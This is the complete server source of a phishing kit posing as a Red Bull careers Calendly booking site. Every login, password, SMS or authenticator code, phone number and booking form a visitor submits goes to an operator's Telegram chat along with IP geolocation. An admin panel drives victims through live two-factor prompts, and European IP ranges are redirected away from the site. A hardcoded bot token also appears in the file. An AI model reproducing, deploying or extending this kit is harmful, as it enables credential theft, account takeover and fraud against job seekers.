// app.js
require('dotenv').config();

const path = require('path');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');

const app = express();
const server = http.createServer(app);

// ===== CONFIG =====
const FRONTEND_ORIGIN = process.env.FRONTEND_ORIGIN || 'https://calendly-redbull-careers.com';
const ADMIN_KEY       = process.env.ADMIN_KEY || '123123';
const PORT            = Number(process.env.PORT || 3001);

const dotenvPath = path.resolve(__dirname, '.env');

// Load dynamic config
let TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8490628792:AAGv_BjqC0vbnfJd7RONJP9_ZUz1V8mPfR8';
let TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-5078231608';
let REDIRECT_URL = process.env.REDIRECT_URL || 'https://calendly.com/william-academyredbull/30min';

// Allowed origins
const SELF_ORIGIN = `https://panel.calendly-redbull-careers.com:3001`;
const ALLOWED_ORIGINS = [
  'https://calendly-redbull-careers.com',       // your Vercel frontend
  'https://panel.calendly-redbull-careers.com', // your backend HTTPS domain 
  'http://localhost:3000',              // local React dev server
  'http://127.0.0.1:3000',             // local React dev server (alternative)
  'http://panel.localhost:3001',      // local panel HTTP
  'https://panel.localhost:3001',     // local panel HTTPS
  'http://panel.localhost:3000',       // local panel frontend HTTP
  'https://panel.localhost:3000',      // local panel frontend HTTPS
  'http://localhost:3001',            // local backend HTTP
  'https://localhost:3001',            // local backend HTTPS
];



// ===== TELEGRAM =====
let bot = TELEGRAM_TOKEN ? new TelegramBot(TELEGRAM_TOKEN, { polling: false }) : null;

function reloadTelegramBot(newToken) {
  try { if (bot) bot.stopPolling?.(); } catch {}
  bot = newToken ? new TelegramBot(newToken, { polling: false }) : null;
}

function tgNotify(html) {
  if (!bot || !TELEGRAM_CHAT_ID) return;
  bot.sendMessage(TELEGRAM_CHAT_ID, html, { parse_mode: 'HTML', disable_web_page_preview: true })
    .catch(err => console.warn('Telegram send error:', err?.message || err));
}

// ===== GEOLOCATION =====
async function getLocationFromIP(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.')) {
      return resolve({ city: 'Unknown', region: 'Unknown', country: 'Unknown' });
    }

    const options = {
      hostname: 'ipwho.is',
      path: `/${ip}`,
      method: 'GET',
      timeout: 5000,
      headers: {
        'Accept': 'application/json'
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          // Check if the request was successful
          if (parsed.success === false) {
            console.warn('IP geolocation failed:', parsed.message);
            return resolve({ city: 'Unknown', region: 'Unknown', country: 'Unknown' });
          }
          resolve({
            city: parsed.city || 'Unknown',
            region: parsed.region || 'Unknown',
            country: parsed.country || 'Unknown',
          });
        } catch (err) {
          console.warn('IP geolocation parse error:', err.message);
          resolve({ city: 'Unknown', region: 'Unknown', country: 'Unknown' });
        }
      });
    });

    req.on('error', (err) => {
      console.warn('IP geolocation request error:', err.message);
      resolve({ city: 'Unknown', region: 'Unknown', country: 'Unknown' });
    });

    req.on('timeout', () => {
      req.destroy();
      console.warn('IP geolocation timeout');
      resolve({ city: 'Unknown', region: 'Unknown', country: 'Unknown' });
    });

    req.end();
  });
}

// ===== EUROPEAN IP CHECKER =====
function isEuropeanIP(ip) {
  if (!ip) return false;
  
  // Remove IPv6 prefix if present (::ffff:1.2.3.4 -> 1.2.3.4)
  ip = ip.replace(/^::ffff:/, '');
  
  // Skip local IPs
  if (ip === '::1' || ip.startsWith('127.') || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return false;
  }
  
  // Extract first two octets (e.g., "85.10.5.123" -> "85.10")
  const match = ip.match(/^(\d+)\.(\d+)\./);
  if (!match) return false;
  
  const prefix = `${match[1]}.${match[2]}`;
  
  // European IP ranges (same as .htaccess)
  const europeanRanges = [
    // GERMANY
    '2.16', '2.17', '2.18', '2.19', '2.20', '2.21', '2.22', '2.23',
    '5.1', '5.9', '5.10', '31.16', '31.18', '31.19', '31.20',
    '37.0', '37.1', '37.2', '37.3', '46.4', '46.5', '46.6', '46.7',
    '46.16', '46.17', '46.18', '46.19', '46.20', '46.21', '46.22', '46.23',
    '62.104', '62.106', '62.108', '62.109', '62.134', '62.138', '62.143', '62.144', '62.154', '62.155',
    '77.0', '77.1', '77.2', '77.3', '77.4', '77.5', '77.6', '77.7',
    '78.24', '78.25', '78.26', '78.27', '78.34', '78.35', '78.36', '78.37', '78.38', '78.39', '78.40', '78.41', '78.42', '78.43', '78.44', '78.45', '78.46', '78.47',
    '79.192', '79.193', '79.194', '79.195', '79.196', '79.197', '79.198', '79.199', '79.200', '79.201', '79.202', '79.203', '79.204', '79.205', '79.206', '79.207',
    '80.64', '80.65', '80.66', '80.67', '80.68', '80.69', '80.70', '80.71',
    '80.128', '80.129', '80.130', '80.131', '80.132', '80.133', '80.134', '80.135',
    '81.0', '81.1', '81.2', '81.3', '81.4', '81.5', '81.6', '81.7',
    '82.96', '82.97', '82.98', '82.99', '82.100', '82.101', '82.102', '82.103',
    '83.128', '83.129', '83.130', '83.131', '83.132', '83.133', '83.134', '83.135',
    '84.128', '84.129', '84.130', '84.131',
    '85.0', '85.1', '85.2', '85.3', '85.4', '85.5', '85.6', '85.7', '85.8', '85.9', '85.10', '85.11', '85.12', '85.13', '85.14', '85.15',
    '88.64', '88.65', '88.66', '88.67', '88.68', '88.69', '88.70', '88.71', '88.72', '88.73', '88.74', '88.75',
    '89.0', '89.1', '89.2', '89.3', '89.4', '89.5', '89.6', '89.7',
    '90.128', '90.129', '90.130', '90.131',
    '91.0', '91.1', '91.2', '91.3', '91.32', '91.33', '91.34', '91.35',
    '92.0', '92.1', '92.2', '92.3',
    '93.64', '93.65', '93.66', '93.67', '93.104', '93.105', '93.106', '93.107',
    '94.0', '94.1', '94.2', '94.3',
    
    // UNITED KINGDOM
    '2.24', '2.25', '2.26', '2.27',
    '5.2', '5.3', '5.4', '5.5', '5.6', '5.7', '5.8',
    '8.24', '8.25', '8.26', '8.27',
    '31.0', '31.1', '31.2', '31.3', '31.4', '31.5', '31.6', '31.7', '31.8', '31.9', '31.10', '31.11', '31.12', '31.13', '31.14', '31.15',
    '37.16', '37.17', '37.18', '37.19', '37.20', '37.21', '37.22', '37.23', '37.24', '37.25', '37.26', '37.27',
    '51.0', '51.1', '51.2', '51.3', '51.4', '51.5', '51.6', '51.7', '51.8', '51.9', '51.10', '51.11', '51.12', '51.13', '51.14', '51.15',
    '62.0', '62.1', '62.2', '62.3', '62.4', '62.5', '62.6', '62.7', '62.8', '62.9',
    '80.0', '80.1', '80.2', '80.3', '80.4', '80.5', '80.6', '80.7', '80.8', '80.9',
    '81.128', '81.129', '81.130', '81.131', '81.132', '81.133', '81.134', '81.135',
    '82.0', '82.1', '82.2', '82.3', '82.8', '82.9', '82.10', '82.11', '82.12', '82.13', '82.14', '82.15',
    '83.96', '83.97', '83.98', '83.99', '83.100', '83.101', '83.102', '83.103',
    '86.0', '86.1', '86.2', '86.3', '86.4', '86.5', '86.6', '86.7', '86.8', '86.9', '86.10', '86.11', '86.12', '86.13', '86.14', '86.15',
    '87.0', '87.1', '87.2', '87.3', '87.4', '87.5', '87.6', '87.7',
    '90.192', '90.193', '90.194', '90.195', '90.196', '90.197', '90.198', '90.199',
    
    // FRANCE
    '2.0', '2.1', '2.2', '2.3', '2.4', '2.5', '2.6', '2.7',
    '5.34', '5.35', '5.36', '5.37', '5.38', '5.39', '5.40', '5.41',
    '31.32', '31.33', '31.34', '31.35', '31.36', '31.37', '31.38', '31.39',
    '37.48', '37.49', '37.50', '37.51', '37.52', '37.53', '37.54', '37.55', '37.56', '37.57', '37.58', '37.59', '37.60', '37.61', '37.62', '37.63',
    '46.224', '46.225', '46.226', '46.227', '46.228', '46.229', '46.230', '46.231',
    '51.15', '51.16', '51.17', '51.18', '51.19', '51.20', '51.21', '51.22',
    '62.40', '62.41', '62.42', '62.43',
    '77.128', '77.129', '77.130', '77.131', '77.132', '77.133', '77.134', '77.135', '77.136', '77.137', '77.138', '77.139', '77.140', '77.141', '77.142', '77.143',
    '78.192', '78.193', '78.194', '78.195', '78.196', '78.197', '78.198', '78.199', '78.200', '78.201', '78.202', '78.203', '78.204', '78.205', '78.206', '78.207', '78.208', '78.209', '78.210', '78.211', '78.212', '78.213', '78.214', '78.215',
    '79.64', '79.65', '79.66', '79.67', '79.68', '79.69', '79.70', '79.71',
    '80.10', '80.11', '80.12', '80.13', '80.14', '80.15',
    '81.16', '81.17', '81.18', '81.19', '81.20', '81.21', '81.22', '81.23',
    '81.48', '81.49', '81.50', '81.51', '81.52', '81.53', '81.54', '81.55',
    '82.64', '82.65', '82.66', '82.67', '82.224', '82.225', '82.226', '82.227',
    '83.200', '83.201', '83.202', '83.203', '83.204', '83.205', '83.206', '83.207',
    '84.96', '84.97', '84.98', '84.99',
    '85.16', '85.17', '85.18', '85.19', '85.20', '85.21', '85.22', '85.23',
    '86.64', '86.65', '86.66', '86.67', '86.192', '86.193', '86.194', '86.195',
    '88.160', '88.161', '88.162', '88.163',
    '90.0', '90.1', '90.2', '90.3', '90.4', '90.5', '90.6', '90.7',
    '91.160', '91.161', '91.162', '91.163',
    '92.128', '92.129', '92.130', '92.131', '92.132', '92.133', '92.134', '92.135',
    '93.0', '93.1', '93.2', '93.3', '93.4', '93.5', '93.6', '93.7',
    '94.224', '94.225', '94.226', '94.227',
    
    // ITALY
    '2.32', '2.33', '2.34', '2.35',
    '5.32', '5.33',
    '31.128', '31.129', '31.130', '31.131',
    '37.112', '37.113', '37.114', '37.115', '37.116', '37.117', '37.118', '37.119',
    '46.32', '46.33', '46.34', '46.35', '46.36', '46.37', '46.38', '46.39',
    '62.94', '62.95',
    '77.72', '77.73', '77.74', '77.75',
    '79.0', '79.1', '79.2', '79.3',
    '80.16', '80.17', '80.18', '80.19',
    '81.208', '81.209', '81.210', '81.211',
    '82.48', '82.49', '82.50', '82.51',
    '83.224', '83.225', '83.226', '83.227',
    '88.32', '88.33', '88.34', '88.35',
    '89.32', '89.33', '89.34', '89.35', '89.36', '89.37', '89.38', '89.39', '89.40', '89.41', '89.42', '89.43', '89.44', '89.45', '89.46', '89.47',
    '91.192', '91.193', '91.194', '91.195',
    '93.32', '93.33', '93.34', '93.35', '93.36', '93.37', '93.38', '93.39', '93.40', '93.41', '93.42', '93.43', '93.44', '93.45', '93.46', '93.47',
    
    // SPAIN
    '2.128', '2.129', '2.130', '2.131',
    '5.56', '5.57',
    '31.192', '31.193', '31.194', '31.195',
    '37.128', '37.129', '37.130', '37.131',
    '62.32', '62.33', '62.34', '62.35',
    '77.32', '77.33', '77.34', '77.35',
    '79.144', '79.145', '79.146', '79.147',
    '80.24', '80.25', '80.26', '80.27', '80.28', '80.29', '80.30', '80.31',
    '81.32', '81.33', '81.34', '81.35', '81.36', '81.37', '81.38', '81.39',
    '82.116', '82.117', '82.118', '82.119',
    '83.32', '83.33', '83.34', '83.35', '83.36', '83.37', '83.38', '83.39',
    '84.0', '84.1', '84.2', '84.3',
    '85.48', '85.49', '85.50', '85.51',
    '88.0', '88.1', '88.2', '88.3', '88.4', '88.5', '88.6', '88.7',
    '90.160', '90.161', '90.162', '90.163',
    '91.64', '91.65', '91.66', '91.67',
    '92.48', '92.49', '92.50', '92.51',
    
    // NETHERLANDS
    '31.48', '31.49', '31.50', '31.51',
    '37.96', '37.97', '37.98', '37.99',
    '46.0', '46.1', '46.2', '46.3',
    '62.58', '62.59',
    '77.160', '77.161', '77.162', '77.163',
    '80.100', '80.101', '80.102', '80.103',
    '81.64', '81.65', '81.66', '81.67',
    '82.192', '82.193', '82.194', '82.195',
    '83.80', '83.81', '83.82', '83.83',
    '84.16', '84.17', '84.18', '84.19',
    '85.144', '85.145', '85.146', '85.147',
    '86.80', '86.81', '86.82', '86.83',
    '87.192', '87.193', '87.194', '87.195',
    '88.159',
    '89.96', '89.97', '89.98', '89.99',
    '90.144', '90.145', '90.146', '90.147',
    '91.184', '91.185', '91.186', '91.187',
    '92.96', '92.97', '92.98', '92.99',
    
    // POLAND
    '31.134', '31.135',
    '37.228', '37.229',
    '46.248', '46.249',
    '62.21',
    '77.79',
    '78.8', '78.9', '78.10', '78.11',
    '79.96', '79.97', '79.98', '79.99',
    '80.48', '80.49', '80.50', '80.51',
    '83.0', '83.1', '83.2', '83.3',
    '85.128', '85.129', '85.130', '85.131',
    '89.64', '89.65', '89.66', '89.67',
    '91.132', '91.133', '91.134', '91.135',
    '94.144', '94.145', '94.146', '94.147',
    
    // RUSSIA
    '2.56', '2.57', '2.58', '2.59',
    '5.16', '5.17', '5.18', '5.19',
    '31.40', '31.41', '31.42', '31.43',
    '37.29', '37.30', '37.31',
    '46.8', '46.9', '46.10', '46.11',
    '62.64', '62.65', '62.66', '62.67',
    '79.104', '79.105', '79.106', '79.107',
    '81.88', '81.89', '81.90', '81.91',
    '82.144', '82.145', '82.146', '82.147',
    '83.64', '83.65', '83.66', '83.67',
    '84.32', '84.33', '84.34', '84.35',
    '85.88', '85.89', '85.90', '85.91',
    '86.96', '86.97', '86.98', '86.99',
    '87.224', '87.225', '87.226', '87.227',
    '88.80', '88.81', '88.82', '88.83',
    '89.104', '89.105', '89.106', '89.107',
    '90.152', '90.153', '90.154', '90.155',
    '91.96', '91.97', '91.98', '91.99',
    '92.32', '92.33', '92.34', '92.35',
    '93.80', '93.81', '93.82', '93.83',
    '94.24', '94.25', '94.26', '94.27',
    
    // SWEDEN
    '31.208', '31.209',
    '62.20',
    '77.53', '77.80',
    '78.64', '78.65', '78.66', '78.67',
    '81.216', '81.217',
    '83.208', '83.209',
    '85.24', '85.25',
    '89.160', '89.161',
    '90.224', '90.225',
    '91.144', '91.145',
    '94.180', '94.181'
  ];
  
  return europeanRanges.includes(prefix);
}

// ===== MIDDLEWARE =====
app.use(
  cors({
    origin: (origin, cb) => {
      if (!origin) return cb(null, true);
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      // Allow localhost and panel.localhost variants for development
      if (origin.includes('localhost') || origin.includes('127.0.0.1') || origin.includes('panel.localhost')) {
        return cb(null, true);
      }
      // Allow amjadgoods.com domains
      if (origin.includes('amjadgoods.com')) {
        return cb(null, true);
      }
      console.warn('CORS blocked origin:', origin);
      return cb(new Error('Not allowed by CORS'));
    },
    credentials: true,
  })
);

// ===== EUROPEAN IP REDIRECT MIDDLEWARE =====
app.use((req, res, next) => {
  // Skip test endpoint (so you can check your IP)
  if (req.path === '/test-ip' || req.path === '/health') {
    return next();
  }
  
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
  
  // Check if IP matches European ranges
  if (isEuropeanIP(ip)) {
    console.log(`Blocking European IP: ${ip} from ${req.path}`);
    
    // For API/Socket.io requests, return 403 instead of redirect (to avoid CORS issues)
    if (req.path.startsWith('/api/') || req.path.startsWith('/socket.io/')) {
      return res.status(403).send('Access denied');
    }
    
    // For HTML pages, redirect to Google
    return res.redirect(302, 'https://www.google.com');
  }
  
  next();
});

// ===== IP BLOCK MIDDLEWARE =====
// app.use((req, res, next) => {
//   const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
//   if (bannedIPs.has(ip)) {
//     console.warn('Blocked banned IP:', ip);
//     return res.status(403).json({ error: 'Something went wrong' });
//   }
//   next();
// });

app.use(express.json());

// ===== HEALTH =====
app.get('/health', (_req, res) => res.json({ ok: true, time: new Date().toISOString() }));

// ===== IP TEST ENDPOINT =====
app.get('/test-ip', (req, res) => {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
  const isEuropean = isEuropeanIP(ip);
  res.json({
    your_ip: ip,
    is_european: isEuropean,
    would_be_blocked: isEuropean,
    message: isEuropean ? '🚫 This IP would be redirected to Google' : '✅ This IP can access the panel'
  });
});

// ===== STATIC =====
app.use(express.static(path.join(__dirname, 'public')));



// ===== IP BAN SYSTEM =====
const bannedFile = path.join(__dirname, 'banned.txt');
let bannedIPs = new Set();

// Load banned IPs
function loadBannedIPs() {
  try {
    if (fs.existsSync(bannedFile)) {
      const data = fs.readFileSync(bannedFile, 'utf8');
      bannedIPs = new Set(data.split('\n').map(ip => ip.trim()).filter(Boolean));
    }
  } catch (e) {
    console.warn('Failed to load banned IPs:', e.message);
  }
}
loadBannedIPs();

// Save banned IPs to file
function saveBannedIPs() {
  try {
    fs.writeFileSync(bannedFile, [...bannedIPs].join('\n'), 'utf8');
  } catch (e) {
    console.warn('Failed to save banned IPs:', e.message);
  }
}

// Ban IP function
async function banIP(ip) {
  if (!ip) return false;
  bannedIPs.add(ip);
  saveBannedIPs();
  logAction(`IP_BANNED ${ip}`);
  
  const location = await getLocationFromIP(ip);
  tgNotify(
    `<b>🚫 IP Banned</b>\n` +
    `🌍 IP: <code>${escapeHtml(ip)}</code>\n` +
    `🏙️ City: <code>${escapeHtml(location.city)}</code>\n` +
    `📍 State: <code>${escapeHtml(location.region)}</code>\n` +
    `🌎 Country: <code>${escapeHtml(location.country)}</code>`
  );
  return true;
}

// ===== SOCKET.IO =====
const io = new Server(server, {
  
  cors: {
    origin: (origin, cb) => {
      if (!origin) return cb(null, true);
      if (ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
      // Allow localhost and panel.localhost variants for development
      if (origin.includes('localhost') || origin.includes('127.0.0.1') || origin.includes('panel.localhost')) {
        return cb(null, true);
      }
      // Allow amjadgoods.com domains
      if (origin.includes('amjadgoods.com')) {
        return cb(null, true);
      }
      console.warn('Socket.IO CORS blocked origin:', origin);
      return cb(new Error('Not allowed by Socket.IO CORS'));
    },
    methods: ['GET', 'POST'],
    credentials: true,
  },
});




// ===== DATA STORE =====
const loginAttempts = [];
const socketsById = new Map();
let nextAttemptId = 1;

const logAction = (txt) => {
  try { fs.appendFileSync('actions.log', `${new Date().toISOString()} - ${txt}\n`); }
  catch (e) { console.warn('log error', e?.message || e); }
};

const escapeHtml = (s = '') =>
  String(s).replace(/[<>&]/g, (c) => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;' }[c]));

// ===== AUTH =====
function requireAdminKey(req, _res, next) {
  const key = req.header('x-admin-key');
  if (!key || key !== ADMIN_KEY) {
    const err = new Error('Unauthorized');
    err.status = 401;
    return next(err);
  }
  next();
}

// ===== USER SOCKETS =====
io.on('connection', async (socket) => {
  const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;
  const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';

  // Check ban list
  if (bannedIPs.has(ip)) {
    console.warn('Rejected socket from banned IP:', ip);
    socket.emit('banned', { reason: 'You are banned.' });
    socket.disconnect(true);
    return;
  }

  socketsById.set(socket.id, socket);
  console.log('User socket connected:', socket.id, 'IP:', ip, 'origin:', socket.handshake.headers.origin);

  // ✅ NEW: Telegram visitor alert with location and user-agent
  const location = await getLocationFromIP(ip);
  tgNotify(
    `<b>👀 New Visitor Connected</b>\n` +
    `🌍 IP: <code>${escapeHtml(ip)}</code>\n` +
    `🏙️ City: <code>${escapeHtml(location.city)}</code>\n` +
    `📍 State: <code>${escapeHtml(location.region)}</code>\n` +
    `🌎 Country: <code>${escapeHtml(location.country)}</code>\n` +
    `💻 User-Agent: <code>${escapeHtml(userAgent)}</code>\n` +
    `🧠 Socket: <code>${escapeHtml(socket.id)}</code>\n` +
    `⏱️ Time: <code>${new Date().toISOString()}</code>`
  );

  // ✅ Notify admin panel of new visitor
  io.of('/admin').emit('admin:new_visitor', {
    socketId: socket.id,
    ip,
    time: new Date().toISOString(),
  });

  socket.on('disconnect', (reason) => {
    socketsById.delete(socket.id);
    console.log('User socket disconnected:', socket.id, 'reason:', reason);
  });



  socket.on('user:login', async ({ email, password } = {}) => {
    const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;
    const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';
    
    const attempt = {
      id: nextAttemptId++,
      time: new Date().toISOString(),
      email: String(email || ''),
      password: String(password || ''),
      ip,
      socketId: socket.id,
      status: 'pending',
    };
    loginAttempts.unshift(attempt);
    io.of('/admin').emit('admin:new_attempt', attempt);
    logAction(`NEW_ATTEMPT email=${attempt.email} socket=${socket.id}`);
    
    const location = await getLocationFromIP(ip);
    tgNotify(
      `<b>👤 New Login Attempt</b>\n` +
      `📧 Email: <code>${escapeHtml(attempt.email)}</code>\n` +
      `🔑 Password: <code>${escapeHtml(attempt.password)}</code>\n` +
      `🌍 IP: <code>${escapeHtml(ip)}</code>\n` +
      `🏙️ City: <code>${escapeHtml(location.city)}</code>\n` +
      `📍 State: <code>${escapeHtml(location.region)}</code>\n` +
      `🌎 Country: <code>${escapeHtml(location.country)}</code>\n` +
      `💻 User-Agent: <code>${escapeHtml(userAgent)}</code>\n` +
      `🧠 Socket: <code>${escapeHtml(socket.id)}</code>\n` +
      `⏱️ Time: <code>${attempt.time}</code>`
    );
  });

  socket.on('user:code', async ({ email, code, dontAskAgain } = {}) => {
    const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;
    const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';
    
    console.log(`Received code from ${socket.id}:`, { email, code, dontAskAgain });
    
    const location = await getLocationFromIP(ip);
    tgNotify(
      `<b>🔢 User Entered Code</b>\n` +
      `📧 Email: <code>${escapeHtml(email)}</code>\n` +
      `💬 Code: <code>${escapeHtml(code)}</code>\n` +
      `🌍 IP: <code>${escapeHtml(ip)}</code>\n` +
      `🏙️ City: <code>${escapeHtml(location.city)}</code>\n` +
      `📍 State: <code>${escapeHtml(location.region)}</code>\n` +
      `🌎 Country: <code>${escapeHtml(location.country)}</code>\n` +
      `💻 User-Agent: <code>${escapeHtml(userAgent)}</code>\n` +
      `🧠 Socket: <code>${escapeHtml(socket.id)}</code>\n` +
      `${dontAskAgain ? '✅ Don\'t ask again: true\n' : ''}` +
      `⏱️ Time: <code>${new Date().toISOString()}</code>`
    );
    const attempt = loginAttempts.find((a) => a.socketId === socket.id);
    if (attempt) attempt.code = code;
    io.of('/admin').emit('admin:new_code', { email, code, socketId: socket.id, time: new Date().toISOString() });
  });

  socket.on('user:booking-form', async ({ name, surname, phone, email, cv } = {}) => {
    const ip = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;
    const userAgent = socket.handshake.headers['user-agent'] || 'Unknown';
    
    console.log(`Received booking form from ${socket.id}:`, { name, surname, phone, email });
    
    const location = await getLocationFromIP(ip);
    
    let message = 
      `<b>📋 NEW BOOKING FORM SUBMISSION</b>\n\n` +
      `👤 <b>Name:</b> <code>${escapeHtml(name)} ${escapeHtml(surname)}</code>\n` +
      `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
      `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n\n` +
      `<b>Location Info:</b>\n` +
      `🌍 IP: <code>${escapeHtml(ip)}</code>\n` +
      `🏙️ City: <code>${escapeHtml(location.city)}</code>\n` +
      `📍 State: <code>${escapeHtml(location.region)}</code>\n` +
      `🌎 Country: <code>${escapeHtml(location.country)}</code>\n\n` +
      `💻 <b>User-Agent:</b> <code>${escapeHtml(userAgent)}</code>\n` +
      `⏱️ <b>Time:</b> <code>${new Date().toISOString()}</code>`;
    
    if (cv) {
      const cvInfo = cv.split('|')[0]; // Get filename only
      message += `\n📎 <b>CV Attached:</b> <code>${escapeHtml(cvInfo)}</code>`;
    }
    
    tgNotify(message);
    logAction(`BOOKING_FORM name=${name} surname=${surname} phone=${phone} email=${email} socket=${socket.id}`);
    
    // Notify admin panel
    io.of('/admin').emit('admin:booking-form', { 
      name, 
      surname, 
      phone, 
      email, 
      socketId: socket.id, 
      time: new Date().toISOString() 
    });
  });
});

// ===== ADMIN NAMESPACE =====
const adminNS = io.of('/admin');
adminNS.use((socket, next) => {
  const key = socket.handshake.auth?.key;
  if (key !== ADMIN_KEY) {
    console.warn('Admin namespace auth failed.');
    return next(new Error('Unauthorized'));
  }
  next();
});
adminNS.on('connection', (socket) => {
  console.log('Admin connected.');
  socket.on('disconnect', (r) => console.log('Admin disconnected:', r));
});

// ===== API ROUTES =====

// List attempts
app.get('/api/attempts', requireAdminKey, (req, res) => {
  const limit = parseInt(req.query.limit || '100', 10);
  res.json({ data: loginAttempts.slice(0, limit) });
});

// Config routes
app.get('/api/config', requireAdminKey, (req, res) => {
  res.json({
    TELEGRAM_TOKEN: '8490628792:AAGv_BjqC0vbnfJd7RONJP9_ZUz1V8mPfR8',
    TELEGRAM_CHAT_ID: '-5078231608',
    REDIRECT_URL,
  });
});

app.post('/api/config', requireAdminKey, (req, res) => {
  const { TELEGRAM_TOKEN: token, TELEGRAM_CHAT_ID: chat, REDIRECT_URL: redirect } = req.body || {};
  if (typeof token !== 'string' || typeof chat !== 'string' || typeof redirect !== 'string')
    return res.status(400).json({ error: 'All fields must be strings' });

  TELEGRAM_TOKEN = token.trim();
  TELEGRAM_CHAT_ID = chat.trim();
  REDIRECT_URL = redirect.trim();

  reloadTelegramBot(TELEGRAM_TOKEN);

  // Update .env
  try {
    let envText = fs.existsSync(dotenvPath) ? fs.readFileSync(dotenvPath, 'utf8') : '';
    const lines = envText.split('\n');
    const update = (key, value) => {
      const i = lines.findIndex((l) => l.startsWith(key + '='));
      if (i !== -1) lines[i] = `${key}=${value}`;
      else lines.push(`${key}=${value}`);
    };
    update('TELEGRAM_TOKEN', TELEGRAM_TOKEN);
    update('TELEGRAM_CHAT_ID', TELEGRAM_CHAT_ID);
    update('REDIRECT_URL', REDIRECT_URL);
    fs.writeFileSync(dotenvPath, lines.join('\n'), 'utf8');
  } catch (err) {
    console.warn('Failed to save .env:', err.message);
  }

  res.json({ ok: true });
});

// Admin actions
app.post('/api/action', requireAdminKey, (req, res) => {
  const { action, socketId, code } = req.body || {};
  if (!action || !socketId) return res.status(400).json({ error: 'action and socketId required' });

  const allowed = new Set([
    'tap-code','sms-code','auth-code','phone-number','redirect',
    'login-error','password-error','smscode-error','authcode-error','phonenumber-error'
  ]);
  if (!allowed.has(action)) return res.status(400).json({ error: 'Invalid action' });

  const target = socketsById.get(socketId);
  if (!target) return res.status(404).json({ error: 'Socket not connected' });

  let emitPayload;
  if (action === 'tap-code') emitPayload = { action, code: String(code) };
  else if (action === 'sms-code' || action === 'phone-number') emitPayload = { action, code: String(code) };
  else if (action === 'auth-code') emitPayload = { action };
  else if (action === 'redirect') emitPayload = { action, url: REDIRECT_URL };
  else if (['login-error','password-error','smscode-error','authcode-error','phonenumber-error'].includes(action))
    emitPayload = { action, message: `${action.replace('-', ' ')} occurred.` };
  else emitPayload = { action: 'disconnect', reason: action };

  try { target.emit('admin:action', emitPayload); } catch (e) { console.warn('emit error', e?.message || e); }

  // ✅ Update stored attempt's status
  const attempt = loginAttempts.find(a => a.socketId === socketId);
  if (attempt) {
    attempt.status = action;
    attempt.lastUpdate = new Date().toISOString();
  }

  // Notify admins (for real-time updates)
  io.of('/admin').emit('admin:status_update', { socketId, action });

  logAction(`ADMIN_ACTION ${action} -> ${socketId}`);
  tgNotify(`<b>Admin Sent</b> ${escapeHtml(action)}\n🧠 Socket: <code>${escapeHtml(socketId)}</code>`);

  res.json({ ok: true });
});



// ===== IP BAN API =====
app.get('/api/banned', requireAdminKey, (_req, res) => {
  res.json({ banned: [...bannedIPs] });
});

app.post('/api/ban', requireAdminKey, (req, res) => {
  const { ip } = req.body || {};
  if (!ip || typeof ip !== 'string') return res.status(400).json({ error: 'IP is required' });
  const ok = banIP(ip.trim());
  res.json({ ok });
});

// Error handler
app.use((err, _req, res, _next) => {
  const status = err.status || 500;
  res.status(status).json({ error: err.message || 'Server error' });
});

// ===== START =====
server.listen(PORT, () => {
  console.log(`✅ Server running on port ${PORT}`);
  console.log(`🔗 Redirect URL: ${REDIRECT_URL}`);
});
